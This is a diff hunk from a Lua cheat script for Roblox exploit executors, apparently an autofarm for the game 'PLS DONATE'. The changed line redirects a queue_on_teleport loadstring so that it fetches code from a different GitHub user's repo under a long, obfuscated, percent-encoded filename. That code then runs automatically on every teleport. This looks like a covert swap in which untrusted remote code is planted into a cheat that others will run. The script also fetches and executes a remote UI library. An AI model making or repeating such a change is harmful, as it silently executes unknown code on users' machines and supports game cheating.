@@ -329,7 +329,7 @@ end
 
 local queueonteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
 local httpservice = game:GetService('HttpService')
-queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/CF-Trail/tzechco-PlsDonateAutofarmBackup/main/autofarm'))()")
+queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/NexKacperr/Aerval/main/EIUYD89WE%26f89327rsGIHDUIWEYr98e7FESDGH98%26%23(%26%40*%26%2398cduigfc*W(%23%24%26%5ER*(WCiyW(*ER%26W)(%24%26rf8eTSFD(%26W%23(84r789YEF*(WYR(%23*%40%247RT(*DUIGUSIFY%23(*%24W%26T(*SEDUFwegsF*%26%23%24R*)(FUCGSE%26*FY%23RYSDUGF*%26W%24YTR%26*yeCUGSE%26*FYW%24(*%26RYFEW*%26FY%23%40%24(*UWEGFUIW%24EYF*(EYFUG784yfsgref7834yf.lua'))()")
 local repoLib = 'https://raw.githubusercontent.com/wally-rblx/LinoriaLib/main/'
 
 local Library = loadstring(game:HttpGet(repoLib .. 'Library.lua'))()
